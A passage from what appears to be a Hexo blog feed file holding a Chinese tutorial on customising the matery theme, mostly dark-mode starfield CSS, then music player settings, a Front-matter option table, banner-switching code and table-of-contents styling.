spellcheck="true">#fff, 851px 1047px </span><span class="token comment" spellcheck="true">#fff, 851px 30px </span><span class="token comment" spellcheck="true">#fff, 596px 1486px </span><span class="token comment" spellcheck="true">#fff, 666px 526px </span><span class="token comment" spellcheck="true">#fff, 1855px 1342px </span><span class="token comment" spellcheck="true">#fff, 80px 531px </span><span class="token comment" spellcheck="true">#fff, 248px 1804px </span><span class="token comment" spellcheck="true">#fff, 1990px 263px </span><span class="token comment" spellcheck="true">#fff, 1796px 1640px </span><span class="token comment" spellcheck="true">#fff, 1502px 862px </span><span class="token comment" spellcheck="true">#fff, 1780px 488px </span><span class="token comment" spellcheck="true">#fff, 1881px 1191px </span><span class="token comment" spellcheck="true">#fff, 1063px 876px </span><span class="token comment" spellcheck="true">#fff, 1614px 1073px </span><span class="token comment" spellcheck="true">#fff, 1414px 666px </span><span class="token comment" spellcheck="true">#fff, 1865px 289px </span><span class="token comment" spellcheck="true">#fff, 687px 352px </span><span class="token comment" spellcheck="true">#fff, 1329px 1312px </span><span class="token comment" spellcheck="true">#fff, 279px 136px </span><span class="token comment" spellcheck="true">#fff, 475px 756px </span><span class="token comment" spellcheck="true">#fff, 1177px 435px </span><span class="token comment" spellcheck="true">#fff, 1264px 921px </span><span class="token comment" spellcheck="true">#fff, 467px 1496px </span><span class="token comment" spellcheck="true">#fff, 391px 1359px </span><span class="token comment" spellcheck="true">#fff, 666px 1083px </span><span class="token comment" spellcheck="true">#fff, 1526px 1251px </span><span class="token comment" spellcheck="true">#fff, 594px 564px </span><span class="token comment" spellcheck="true">#fff, 991px 525px </span><span class="token comment" spellcheck="true">#fff, 1511px 875px </span><span class="token comment" spellcheck="true">#fff, 1935px 1049px </span><span class="token comment" spellcheck="true">#fff, 1471px 1430px </span><span class="token comment" spellcheck="true">#fff, 959px 604px </span><span class="token comment" spellcheck="true">#fff, 1685px 72px </span><span class="token comment" spellcheck="true">#fff, 1505px 1876px </span><span class="token comment" spellcheck="true">#fff, 509px 1627px </span><span class="token comment" spellcheck="true">#fff, 1065px 978px </span><span class="token comment" spellcheck="true">#fff, 1860px 884px </span><span class="token comment" spellcheck="true">#fff, 1038px 464px </span><span class="token comment" spellcheck="true">#fff, 1051px 106px </span><span class="token comment" spellcheck="true">#fff, 1056px 728px </span><span class="token comment" spellcheck="true">#fff, 1953px 45px </span><span class="token comment" spellcheck="true">#fff, 1483px 638px </span><span class="token comment" spellcheck="true">#fff, 559px 845px </span><span class="token comment" spellcheck="true">#fff, 1184px 922px </span><span class="token comment" spellcheck="true">#fff, 1320px 1117px </span><span class="token comment" spellcheck="true">#fff, 1572px 747px </span><span class="token comment" spellcheck="true">#fff, 1971px 43px </span><span class="token comment" spellcheck="true">#fff, 665px 13px </span><span class="token comment" spellcheck="true">#fff, 1457px 1153px </span><span class="token comment" spellcheck="true">#fff, 848px 154px </span><span class="token comment" spellcheck="true">#fff, 1039px 1837px </span><span class="token comment" spellcheck="true">#fff, 878px 795px </span><span class="token comment" spellcheck="true">#fff, 1286px 1705px </span><span class="token comment" spellcheck="true">#fff, 1946px 1143px </span><span class="token comment" spellcheck="true">#fff, 1114px 1166px </span><span class="token comment" spellcheck="true">#fff, 1747px 874px </span><span class="token comment" spellcheck="true">#fff, 1894px 636px </span><span class="token comment" spellcheck="true">#fff, 1316px 541px </span><span class="token comment" spellcheck="true">#fff, 1953px 1620px </span><span class="token comment" spellcheck="true">#fff, 1446px 1773px </span><span class="token comment" spellcheck="true">#fff, 974px 833px </span><span class="token comment" spellcheck="true">#fff, 1814px 1211px </span><span class="token comment" spellcheck="true">#fff, 102px 335px </span><span class="token comment" spellcheck="true">#fff, 327px 1868px </span><span class="token comment" spellcheck="true">#fff, 348px 548px </span><span class="token comment" spellcheck="true">#fff, 353px 1540px </span><span class="token comment" spellcheck="true">#fff, 1212px 1872px </span><span class="token comment" spellcheck="true">#fff, 1968px 129px </span><span class="token comment" spellcheck="true">#fff, 1531px 644px </span><span class="token comment" spellcheck="true">#fff, 1939px 559px </span><span class="token comment" spellcheck="true">#fff, 1397px 1876px </span><span class="token comment" spellcheck="true">#fff, 1446px 1446px </span><span class="token comment" spellcheck="true">#fff, 1721px 603px </span><span class="token comment" spellcheck="true">#fff, 924px 1171px </span><span class="token comment" spellcheck="true">#fff, 1086px 1954px </span><span class="token comment" spellcheck="true">#fff, 1798px 310px </span><span class="token comment" spellcheck="true">#fff, 21px 1595px </span><span class="token comment" spellcheck="true">#fff, 1462px 1948px </span><span class="token comment" spellcheck="true">#fff, 149px 1752px </span><span class="token comment" spellcheck="true">#fff, 804px 318px </span><span class="token comment" spellcheck="true">#fff, 1262px 636px </span><span class="token comment" spellcheck="true">#fff, 1051px 100px </span><span class="token comment" spellcheck="true">#fff, 392px 560px </span><span class="token comment" spellcheck="true">#fff, 654px 1236px </span><span class="token comment" spellcheck="true">#fff, 1889px 1159px </span><span class="token comment" spellcheck="true">#fff, 498px 394px </span><span class="token comment" spellcheck="true">#fff, 522px 1889px </span><span class="token comment" spellcheck="true">#fff, 1198px 579px </span><span class="token comment" spellcheck="true">#fff, 1437px 1866px </span><span class="token comment" spellcheck="true">#fff, 1049px 1064px </span><span class="token comment" spellcheck="true">#fff, 286px 921px </span><span class="token comment" spellcheck="true">#fff, 993px 1790px </span><span class="token comment" spellcheck="true">#fff, 1557px 1997px </span><span class="token comment" spellcheck="true">#fff, 1525px 532px </span><span class="token comment" spellcheck="true">#fff, 481px 1561px </span><span class="token comment" spellcheck="true">#fff, 790px 683px </span><span class="token comment" spellcheck="true">#fff, 141px 17px </span><span class="token comment" spellcheck="true">#fff, 1202px 28px </span><span class="token comment" spellcheck="true">#fff, 518px 1927px </span><span class="token comment" spellcheck="true">#fff, 90px 1677px </span><span class="token comment" spellcheck="true">#fff, 1258px 370px </span><span class="token comment" spellcheck="true">#fff, 1379px 1536px </span><span class="token comment" spellcheck="true">#fff, 607px 474px </span><span class="token comment" spellcheck="true">#fff, 163px 139px </span><span class="token comment" spellcheck="true">#fff, 1025px 1359px </span><span class="token comment" spellcheck="true">#fff, 815px 845px </span><span class="token comment" spellcheck="true">#fff, 231px 1212px </span><span class="token comment" spellcheck="true">#fff, 192px 806px </span><span class="token comment" spellcheck="true">#fff, 313px 1946px </span><span class="token comment" spellcheck="true">#fff, 1132px 1808px </span><span class="token comment" spellcheck="true">#fff, 624px 767px </span><span class="token comment" spellcheck="true">#fff, 379px 722px </span><span class="token comment" spellcheck="true">#fff, 733px 1847px </span><span class="token comment" spellcheck="true">#fff, 628px 1517px </span><span class="token comment" spellcheck="true">#fff, 1559px 929px </span><span class="token comment" spellcheck="true">#fff, 234px 397px </span><span class="token comment" spellcheck="true">#fff, 1230px 1231px </span><span class="token comment" spellcheck="true">#fff, 849px 726px </span><span class="token comment" spellcheck="true">#fff, 1148px 786px </span><span class="token comment" spellcheck="true">#fff, 546px 1533px </span><span class="token comment" spellcheck="true">#fff, 477px 822px </span><span class="token comment" spellcheck="true">#fff, 1325px 480px </span><span class="token comment" spellcheck="true">#fff, 972px 383px </span><span class="token comment" spellcheck="true">#fff, 334px 958px </span><span class="token comment" spellcheck="true">#fff, 1032px 664px </span><span class="token comment" spellcheck="true">#fff, 1781px 40px </span><span class="token comment" spellcheck="true">#fff, 38px 1335px </span><span class="token comment" spellcheck="true">#fff, 1634px 1691px </span><span class="token comment" spellcheck="true">#fff, 1061px 680px </span><span class="token comment" spellcheck="true">#fff, 1319px 304px </span><span class="token comment" spellcheck="true">#fff, 82px 1776px </span><span class="token comment" spellcheck="true">#fff, 1302px 509px </span><span class="token comment" spellcheck="true">#fff, 1231px 746px </span><span class="token comment" spellcheck="true">#fff, 1264px 1509px </span><span class="token comment" spellcheck="true">#fff, 980px 495px </span><span class="token comment" spellcheck="true">#fff, 1153px 1381px </span><span class="token comment" spellcheck="true">#fff, 1981px 1918px </span><span class="token comment" spellcheck="true">#fff, 70px 113px </span><span class="token comment" spellcheck="true">#fff, 390px 736px </span><span class="token comment" spellcheck="true">#fff, 1882px 1925px </span><span class="token comment" spellcheck="true">#fff, 1380px 1326px </span><span class="token comment" spellcheck="true">#fff, 257px 1681px </span><span class="token comment" spellcheck="true">#fff, 860px 998px </span><span class="token comment" spellcheck="true">#fff, 518px 1136px </span><span class="token comment" spellcheck="true">#fff, 168px 905px </span><span class="token comment" spellcheck="true">#fff, 500px 1882px </span><span class="token comment" spellcheck="true">#fff, 1012px 1572px </span><span class="token comment" spellcheck="true">#fff, 349px 1916px </span><span class="token comment" spellcheck="true">#fff, 905px 1339px </span><span class="token comment" spellcheck="true">#fff, 1940px 1803px </span><span class="token comment" spellcheck="true">#fff, 23px 1159px </span><span class="token comment" spellcheck="true">#fff, 9px 1559px </span><span class="token comment" spellcheck="true">#fff, 1658px 776px </span><span class="token comment" spellcheck="true">#fff, 820px 1361px </span><span class="token comment" spellcheck="true">#fff, 171px 983px </span><span class="token comment" spellcheck="true">#fff, 580px 1902px </span><span class="token comment" spellcheck="true">#fff, 1268px 263px </span><span class="token comment" spellcheck="true">#fff, 1734px 994px </span><span class="token comment" spellcheck="true">#fff, 1872px 29px </span><span class="token comment" spellcheck="true">#fff, 1475px 435px </span><span class="token comment" spellcheck="true">#fff;</span><span class="token punctuation">}</span>body.DarkMode <span class="token comment" spellcheck="true">#stars3 {</span>    width: 3px<span class="token punctuation">;</span>    height: 3px<span class="token punctuation">;</span>    background: 0 0<span class="token punctuation">;</span>    box-shadow: 519px 875px <span class="token comment" spellcheck="true">#fff, 1497px 751px </span><span class="token comment" spellcheck="true">#fff, 1256px 88px </span><span class="token comment" spellcheck="true">#fff, 1168px 1791px </span><span class="token comment" spellcheck="true">#fff, 1884px 109px </span><span class="token comment" spellcheck="true">#fff, 1465px 451px </span><span class="token comment" spellcheck="true">#fff, 450px 370px </span><span class="token comment" spellcheck="true">#fff, 1560px 703px </span><span class="token comment" spellcheck="true">#fff, 1788px 1997px </span><span class="token comment" spellcheck="true">#fff, 1047px 963px </span><span class="token comment" spellcheck="true">#fff, 1281px 119px </span><span class="token comment" spellcheck="true">#fff, 439px 96px </span><span class="token comment" spellcheck="true">#fff, 164px 1956px </span><span class="token comment" spellcheck="true">#fff, 1360px 930px </span><span class="token comment" spellcheck="true">#fff, 1387px 347px </span><span class="token comment" spellcheck="true">#fff, 1073px 1970px </span><span class="token comment" spellcheck="true">#fff, 1296px 284px </span><span class="token comment" spellcheck="true">#fff, 25px 1602px </span><span class="token comment" spellcheck="true">#fff, 455px 944px </span><span class="token comment" spellcheck="true">#fff, 1177px 738px </span><span class="token comment" spellcheck="true">#fff, 633px 1142px </span><span class="token comment" spellcheck="true">#fff, 1730px 1079px </span><span class="token comment" spellcheck="true">#fff, 1283px 1606px </span><span class="token comment" spellcheck="true">#fff, 674px 1186px </span><span class="token comment" spellcheck="true">#fff, 513px 166px </span><span class="token comment" spellcheck="true">#fff, 1077px 636px </span><span class="token comment" spellcheck="true">#fff, 1811px 580px </span><span class="token comment" spellcheck="true">#fff, 971px 1789px </span><span class="token comment" spellcheck="true">#fff, 694px 1756px </span><span class="token comment" spellcheck="true">#fff, 703px 1138px </span><span class="token comment" spellcheck="true">#fff, 1290px 942px </span><span class="token comment" spellcheck="true">#fff, 351px 1509px </span><span class="token comment" spellcheck="true">#fff, 1904px 790px </span><span class="token comment" spellcheck="true">#fff, 68px 819px </span><span class="token comment" spellcheck="true">#fff, 1097px 362px </span><span class="token comment" spellcheck="true">#fff, 1035px 331px </span><span class="token comment" spellcheck="true">#fff, 180px 940px </span><span class="token comment" spellcheck="true">#fff, 1776px 1229px </span><span class="token comment" spellcheck="true">#fff, 1487px 781px </span><span class="token comment" spellcheck="true">#fff, 1131px 1765px </span><span class="token comment" spellcheck="true">#fff, 1684px 536px </span><span class="token comment" spellcheck="true">#fff, 939px 367px </span><span class="token comment" spellcheck="true">#fff, 1102px 1481px </span><span class="token comment" spellcheck="true">#fff, 741px 887px </span><span class="token comment" spellcheck="true">#fff, 167px 1132px </span><span class="token comment" spellcheck="true">#fff, 1756px 529px </span><span class="token comment" spellcheck="true">#fff, 608px 758px </span><span class="token comment" spellcheck="true">#fff, 541px 1025px </span><span class="token comment" spellcheck="true">#fff, 1976px 505px </span><span class="token comment" spellcheck="true">#fff, 1349px 1257px </span><span class="token comment" spellcheck="true">#fff, 815px 1388px </span><span class="token comment" spellcheck="true">#fff, 505px 1351px </span><span class="token comment" spellcheck="true">#fff, 33px 1945px </span><span class="token comment" spellcheck="true">#fff, 861px 1695px </span><span class="token comment" spellcheck="true">#fff, 678px 1360px </span><span class="token comment" spellcheck="true">#fff, 1615px 727px </span><span class="token comment" spellcheck="true">#fff, 1138px 726px </span><span class="token comment" spellcheck="true">#fff, 30px 293px </span><span class="token comment" spellcheck="true">#fff, 1624px 1044px </span><span class="token comment" spellcheck="true">#fff, 683px 1242px </span><span class="token comment" spellcheck="true">#fff, 1781px 1758px </span><span class="token comment" spellcheck="true">#fff, 906px 1328px </span><span class="token comment" spellcheck="true">#fff, 1066px 1764px </span><span class="token comment" spellcheck="true">#fff, 1568px 664px </span><span class="token comment" spellcheck="true">#fff, 1027px 1876px </span><span class="token comment" spellcheck="true">#fff, 775px 1099px </span><span class="token comment" spellcheck="true">#fff, 1605px 208px </span><span class="token comment" spellcheck="true">#fff, 730px 837px </span><span class="token comment" spellcheck="true">#fff, 1475px 1482px </span><span class="token comment" spellcheck="true">#fff, 871px 1759px </span><span class="token comment" spellcheck="true">#fff, 1240px 15px </span><span class="token comment" spellcheck="true">#fff, 1987px 705px </span><span class="token comment" spellcheck="true">#fff, 302px 1049px </span><span class="token comment" spellcheck="true">#fff, 475px 1015px </span><span class="token comment" spellcheck="true">#fff, 1843px 1296px </span><span class="token comment" spellcheck="true">#fff, 493px 631px </span><span class="token comment" spellcheck="true">#fff, 1613px 164px </span><span class="token comment" spellcheck="true">#fff, 1863px 156px </span><span class="token comment" spellcheck="true">#fff, 1479px 423px </span><span class="token comment" spellcheck="true">#fff, 202px 1499px </span><span class="token comment" spellcheck="true">#fff, 886px 969px </span><span class="token comment" spellcheck="true">#fff, 904px 930px </span><span class="token comment" spellcheck="true">#fff, 1853px 535px </span><span class="token comment" spellcheck="true">#fff, 726px 914px </span><span class="token comment" spellcheck="true">#fff, 435px 1205px </span><span class="token comment" spellcheck="true">#fff, 1732px 1824px </span><span class="token comment" spellcheck="true">#fff, 1212px 667px </span><span class="token comment" spellcheck="true">#fff, 499px 31px </span><span class="token comment" spellcheck="true">#fff, 552px 594px </span><span class="token comment" spellcheck="true">#fff, 1715px 1814px </span><span class="token comment" spellcheck="true">#fff, 775px 908px </span><span class="token comment" spellcheck="true">#fff, 1949px 921px </span><span class="token comment" spellcheck="true">#fff, 1267px 718px </span><span class="token comment" spellcheck="true">#fff, 1830px 1960px </span><span class="token comment" spellcheck="true">#fff, 338px 1325px </span><span class="token comment" spellcheck="true">#fff, 466px 1120px </span><span class="token comment" spellcheck="true">#fff, 140px 1675px </span><span class="token comment" spellcheck="true">#fff, 1919px 664px </span><span class="token comment" spellcheck="true">#fff, 1136px 771px </span><span class="token comment" spellcheck="true">#fff, 1888px 1302px </span><span class="token comment" spellcheck="true">#fff;</span>    animation: animStar 150s linear infinite<span class="token punctuation">;</span><span class="token punctuation">}</span>body.DarkMode <span class="token comment" spellcheck="true">#stars3:after {</span>    content: <span class="token string">" "</span><span class="token punctuation">;</span>    position: absolute<span class="token punctuation">;</span>    top: 2000px<span class="token punctuation">;</span>    width: 3px<span class="token punctuation">;</span>    height: 3px<span class="token punctuation">;</span>    background: 0 0<span class="token punctuation">;</span>    box-shadow: 519px 875px <span class="token comment" spellcheck="true">#fff, 1497px 751px </span><span class="token comment" spellcheck="true">#fff, 1256px 88px </span><span class="token comment" spellcheck="true">#fff, 1168px 1791px </span><span class="token comment" spellcheck="true">#fff, 1884px 109px </span><span class="token comment" spellcheck="true">#fff, 1465px 451px </span><span class="token comment" spellcheck="true">#fff, 450px 370px </span><span class="token comment" spellcheck="true">#fff, 1560px 703px </span><span class="token comment" spellcheck="true">#fff, 1788px 1997px </span><span class="token comment" spellcheck="true">#fff, 1047px 963px </span><span class="token comment" spellcheck="true">#fff, 1281px 119px </span><span class="token comment" spellcheck="true">#fff, 439px 96px </span><span class="token comment" spellcheck="true">#fff, 164px 1956px </span><span class="token comment" spellcheck="true">#fff, 1360px 930px </span><span class="token comment" spellcheck="true">#fff, 1387px 347px </span><span class="token comment" spellcheck="true">#fff, 1073px 1970px </span><span class="token comment" spellcheck="true">#fff, 1296px 284px </span><span class="token comment" spellcheck="true">#fff, 25px 1602px </span><span class="token comment" spellcheck="true">#fff, 455px 944px </span><span class="token comment" spellcheck="true">#fff, 1177px 738px </span><span class="token comment" spellcheck="true">#fff, 633px 1142px </span><span class="token comment" spellcheck="true">#fff, 1730px 1079px </span><span class="token comment" spellcheck="true">#fff, 1283px 1606px </span><span class="token comment" spellcheck="true">#fff, 674px 1186px </span><span class="token comment" spellcheck="true">#fff, 513px 166px </span><span class="token comment" spellcheck="true">#fff, 1077px 636px </span><span class="token comment" spellcheck="true">#fff, 1811px 580px </span><span class="token comment" spellcheck="true">#fff, 971px 1789px </span><span class="token comment" spellcheck="true">#fff, 694px 1756px </span><span class="token comment" spellcheck="true">#fff, 703px 1138px </span><span class="token comment" spellcheck="true">#fff, 1290px 942px </span><span class="token comment" spellcheck="true">#fff, 351px 1509px </span><span class="token comment" spellcheck="true">#fff, 1904px 790px </span><span class="token comment" spellcheck="true">#fff, 68px 819px </span><span class="token comment" spellcheck="true">#fff, 1097px 362px </span><span class="token comment" spellcheck="true">#fff, 1035px 331px </span><span class="token comment" spellcheck="true">#fff, 180px 940px </span><span class="token comment" spellcheck="true">#fff, 1776px 1229px </span><span class="token comment" spellcheck="true">#fff, 1487px 781px </span><span class="token comment" spellcheck="true">#fff, 1131px 1765px </span><span class="token comment" spellcheck="true">#fff, 1684px 536px </span><span class="token comment" spellcheck="true">#fff, 939px 367px </span><span class="token comment" spellcheck="true">#fff, 1102px 1481px </span><span class="token comment" spellcheck="true">#fff, 741px 887px </span><span class="token comment" spellcheck="true">#fff, 167px 1132px </span><span class="token comment" spellcheck="true">#fff, 1756px 529px </span><span class="token comment" spellcheck="true">#fff, 608px 758px </span><span class="token comment" spellcheck="true">#fff, 541px 1025px </span><span class="token comment" spellcheck="true">#fff, 1976px 505px </span><span class="token comment" spellcheck="true">#fff, 1349px 1257px </span><span class="token comment" spellcheck="true">#fff, 815px 1388px </span><span class="token comment" spellcheck="true">#fff, 505px 1351px </span><span class="token comment" spellcheck="true">#fff, 33px 1945px </span><span class="token comment" spellcheck="true">#fff, 861px 1695px </span><span class="token comment" spellcheck="true">#fff, 678px 1360px </span><span class="token comment" spellcheck="true">#fff, 1615px 727px </span><span class="token comment" spellcheck="true">#fff, 1138px 726px </span><span class="token comment" spellcheck="true">#fff, 30px 293px </span><span class="token comment" spellcheck="true">#fff, 1624px 1044px </span><span class="token comment" spellcheck="true">#fff, 683px 1242px </span><span class="token comment" spellcheck="true">#fff, 1781px 1758px </span><span class="token comment" spellcheck="true">#fff, 906px 1328px </span><span class="token comment" spellcheck="true">#fff, 1066px 1764px </span><span class="token comment" spellcheck="true">#fff, 1568px 664px </span><span class="token comment" spellcheck="true">#fff, 1027px 1876px </span><span class="token comment" spellcheck="true">#fff, 775px 1099px </span><span class="token comment" spellcheck="true">#fff, 1605px 208px </span><span class="token comment" spellcheck="true">#fff, 730px 837px </span><span class="token comment" spellcheck="true">#fff, 1475px 1482px </span><span class="token comment" spellcheck="true">#fff, 871px 1759px </span><span class="token comment" spellcheck="true">#fff, 1240px 15px </span><span class="token comment" spellcheck="true">#fff, 1987px 705px </span><span class="token comment" spellcheck="true">#fff, 302px 1049px </span><span class="token comment" spellcheck="true">#fff, 475px 1015px </span><span class="token comment" spellcheck="true">#fff, 1843px 1296px </span><span class="token comment" spellcheck="true">#fff, 493px 631px </span><span class="token comment" spellcheck="true">#fff, 1613px 164px </span><span class="token comment" spellcheck="true">#fff, 1863px 156px </span><span class="token comment" spellcheck="true">#fff, 1479px 423px </span><span class="token comment" spellcheck="true">#fff, 202px 1499px </span><span class="token comment" spellcheck="true">#fff, 886px 969px </span><span class="token comment" spellcheck="true">#fff, 904px 930px </span><span class="token comment" spellcheck="true">#fff, 1853px 535px </span><span class="token comment" spellcheck="true">#fff, 726px 914px </span><span class="token comment" spellcheck="true">#fff, 435px 1205px </span><span class="token comment" spellcheck="true">#fff, 1732px 1824px </span><span class="token comment" spellcheck="true">#fff, 1212px 667px </span><span class="token comment" spellcheck="true">#fff, 499px 31px </span><span class="token comment" spellcheck="true">#fff, 552px 594px </span><span class="token comment" spellcheck="true">#fff, 1715px 1814px </span><span class="token comment" spellcheck="true">#fff, 775px 908px </span><span class="token comment" spellcheck="true">#fff, 1949px 921px </span><span class="token comment" spellcheck="true">#fff, 1267px 718px </span><span class="token comment" spellcheck="true">#fff, 1830px 1960px </span><span class="token comment" spellcheck="true">#fff, 338px 1325px </span><span class="token comment" spellcheck="true">#fff, 466px 1120px </span><span class="token comment" spellcheck="true">#fff, 140px 1675px </span><span class="token comment" spellcheck="true">#fff, 1919px 664px </span><span class="token comment" spellcheck="true">#fff, 1136px 771px </span><span class="token comment" spellcheck="true">#fff, 1888px 1302px </span><span class="token comment" spellcheck="true">#fff;</span><span class="token punctuation">}</span></code></pre><p>到此，黑夜模式算是真正完成了。</p><h5 id="2-14-配置音乐播放器（可选）"><a href="#2-14-配置音乐播放器（可选）" class="headerlink" title="2.14 配置音乐播放器（可选）"></a>2.14 配置音乐播放器（可选）</h5><p>要支持音乐播放，在主题的 <code>_config.yml</code> 配置文件中激活<code>music</code>配置即可</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 是否在首页显示音乐</span>music:  enable: <span class="token boolean">true</span>  title:         <span class="token comment" spellcheck="true">#非吸底模式有效</span>    enable: <span class="token boolean">true</span>    show: 听听音乐  server: netease   <span class="token comment" spellcheck="true">#require music platform: netease, tencent, kugou, xiami, baidu</span>  type: playlist    <span class="token comment" spellcheck="true">#require song, playlist, album, search, artist</span>  id: 503838841     <span class="token comment" spellcheck="true">#require song id / playlist id / album id / search keyword</span>  fixed: <span class="token boolean">false</span>      <span class="token comment" spellcheck="true"># 开启吸底模式</span>  autoplay: <span class="token boolean">false</span>   <span class="token comment" spellcheck="true"># 是否自动播放</span>  theme: <span class="token string">'#42b983'</span>  loop: <span class="token string">'all'</span>       <span class="token comment" spellcheck="true"># 音频循环播放, 可选值: 'all', 'one', 'none'</span>  order: <span class="token string">'random'</span>   <span class="token comment" spellcheck="true"># 音频循环顺序, 可选值: 'list', 'random'</span>  preload: <span class="token string">'auto'</span>   <span class="token comment" spellcheck="true"># 预加载，可选值: 'none', 'metadata', 'auto'</span>  volume: 0.7       <span class="token comment" spellcheck="true"># 默认音量，请注意播放器会记忆用户设置，用户手动设置音量后默认音量即失效</span>  listFolded: <span class="token boolean">true</span>  <span class="token comment" spellcheck="true"># 列表默认折叠</span>提示：    server可选netease（网易云音乐），tencent（QQ音乐），kugou（酷狗音乐），xiami（虾米音乐），baidu（百度音乐）。    type可选song（歌曲），playlist（歌单），album（专辑），search（搜索关键字），artist（歌手）    id获取示例: 浏览器打开网易云音乐，点击我喜欢的音乐歌单，地址栏有一串数字，playlist的id即为这串数字。</code></pre><h5 id="2-15-文章-Front-matter-介绍"><a href="#2-15-文章-Front-matter-介绍" class="headerlink" title="2.15 文章 Front-matter 介绍"></a>2.15 文章 Front-matter 介绍</h5><p><code>Front-matter</code> 选项中的所有内容均为非必填的。但我仍然建议至少填写 <code>title</code> 和 <code>date</code> 的值。</p><table><thead><tr><th>配置选项</th><th>默认值</th><th>描述</th></tr></thead><tbody><tr><td>title</td><td>Markdown 的文件标题</td><td>文章标题，强烈建议填写此选项</td></tr><tr><td>date</td><td>文件创建时的日期时间</td><td>发布时间，强烈建议填写此选项，且最好保证全局唯一</td></tr><tr><td>author</td><td>根 _config.yml 中的 author</td><td>文章作者</td></tr><tr><td>img</td><td>featureImages 中的某个值</td><td>文章特征图，推荐使用图床(腾讯云、七牛云、又拍云等)来做图片的路径.如: <a href="http://xxx.com/xxx.jpg">http://xxx.com/xxx.jpg</a></td></tr><tr><td>top</td><td>true</td><td>推荐文章（文章是否置顶），如果 top 值为 true，则会作为首页推荐文章</td></tr><tr><td>cover</td><td>false</td><td>v1.0.2版本新增，表示该文章是否需要加入到首页轮播封面中</td></tr><tr><td>coverImg</td><td>无</td><td>v1.0.2版本新增，表示该文章在首页轮播封面需要显示的图片路径，如果没有，则默认使用文章的特色图片</td></tr><tr><td>password</td><td>无</td><td>文章阅读密码，如果要对文章设置阅读验证密码的话，就可以设置 password 的值，该值必须是用 SHA256 加密后的密码，防止被他人识破。前提是在主题的 config.yml 中激活了 verifyPassword 选项</td></tr><tr><td>toc</td><td>true</td><td>是否开启 TOC，可以针对某篇文章单独关闭 TOC 的功能。前提是在主题的 config.yml 中激活了 toc 选项</td></tr><tr><td>mathjax</td><td>false</td><td>是否开启数学公式支持 ，本文章是否开启 mathjax，且需要在主题的 _config.yml 文件中也需要开启才行</td></tr><tr><td>summary</td><td>无</td><td>文章摘要，自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要</td></tr><tr><td>categories</td><td>无</td><td>文章分类，本主题的分类表示宏观上大的分类，只建议一篇文章一个分类</td></tr><tr><td>tags</td><td>无</td><td>文章标签，一篇文章可以多个标签</td></tr><tr><td>keywords</td><td>文章标题</td><td>文章关键字，SEO 时需要</td></tr><tr><td>reprintPolicy</td><td>cc_by</td><td>文章转载规则， 可以是 cc_by, cc_by_nd, cc_by_sa, cc_by_nc, cc_by_nc_nd, cc_by_nc_sa, cc0, noreprint 或 pay 中的一个</td></tr></tbody></table><blockquote><p>注意:<br>    如果 img 属性不填写的话，文章特色图会根据文章标题的 hashcode 的值取余，然后选取主题中对应的特色图片，从而达到让所有文章都的特色图各有特色。<br>    date 的值尽量保证每篇文章是唯一的，因为本主题中 Gitalk 和 Gitment 识别 id 是通过 date 的值来作为唯一标识的。<br>    如果要对文章设置阅读验证密码的功能，不仅要在 Front-matter 中设置采用了 SHA256 加密的 password 的值，还需要在主题的 _config.yml 中激活了配置。有些在线的 SHA256 加密的地址，可供你使用：开源中国在线工具、chahuo、站长工具。<br>    您可以在文章md文件的 front-matter 中指定 reprintPolicy 来给单个文章配置转载规则</p></blockquote><h5 id="2-16-修改-banner-图和文章特色图"><a href="#2-16-修改-banner-图和文章特色图" class="headerlink" title="2.16 修改 banner 图和文章特色图"></a>2.16 修改 banner 图和文章特色图</h5><p>你可以直接在 <code>/source/medias/banner</code> 文件夹中更换你喜欢的 <code>banner</code> 图片，主题代码中是每天动态切换一张，只需 7 张即可。如果你会 <code>JavaScript</code> 代码，可以修改成你自己喜欢切换逻辑，如：随机切换等，<code>banner</code> 切换的代码位置在 <code>/layout/_partial/bg-cover-content.ejs</code> 文件的 <code>&lt;script&gt;&lt;/script&gt;</code> 代码中:</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">$(</span><span class="token string">'.bg-cover'</span><span class="token punctuation">)</span>.css<span class="token punctuation">(</span><span class="token string">'background-image'</span>, <span class="token string">'url(/medias/banner/'</span> + new Date<span class="token punctuation">(</span><span class="token punctuation">)</span>.getDay<span class="token punctuation">(</span><span class="token punctuation">)</span> + <span class="token string">'.jpg)'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>在 <code>/source/medias/featureimages</code> 文件夹中默认有 24 张特色图片，你可以再增加或者减少，并需要在 <code>_config.yml</code> 做同步修改。</p><h5 id="2-17-优化目录栏"><a href="#2-17-优化目录栏" class="headerlink" title="2.17 优化目录栏"></a>2.17 优化目录栏</h5><p>在 <code>themes\Matery\layout\_partial\post-detail-toc.ejs</code>，修改内容如下：</p><pre class=" language-bash"><code class="language-bash">.toc-widget <span class="token punctuation">{</span>    padding-left: 20px<span class="token punctuation">;</span>    width: 345px<span class="token punctuation">;</span>    background-color: rgb<span class="token punctuation">(</span>255, 255, 255,0.7<span class="token punctuation">)</span><span class="token punctuation">;</span>    border-radius: 10px<span class="token punctuation">;</span>    box-shadow: 0 10px 35px 2px rgba<span class="token punctuation">(</span>0, 0, 0, .15<span class="token punctuation">)</span>, 0 5px 15px rgba<span class="token punctuation">(</span>0, 0, 0, .07<span class="token punctuation">)</span>, 0 2px 5px -5px rgba<span class="token punctuation">(</span>0, 0, 0, .1<span class="token punctuation">)</span> <span class="token operator">!</span>important<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">#toc-content {</span>    margin-bottom: 20px<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="0x004-更多详细教程"><a href="#0x004-更多详细教程" class="headerlink" title="0x004 更多详细教程"></a>0x004 更多详细教程</h3><p>以下几篇文章都是基于<code>Hexo</code>框架和<code>hexo-theme-matery</code>主题优化的教程，大家如果遇到问题，可以参考其中的方法。</p><ul><li><a href="https://sunhwee.com/posts/6e8839eb.html#toc-heading-33">Hexo+Github博客搭建完全教程</a></li><li><a href="http://www.luckyzmj.cn/posts/e3e08109.html#toc-heading-41">个人博客搭建</a></li><li><a href="https://blog.17lai.site/posts/4a2050e2/">基于Hexo的matery主题搭建博客个性定制篇5_</a></li></ul><hr>]]></content>
      
      
      <categories>
          
          <category> MyBlog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> github </tag>
            
            <tag> MyBlog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
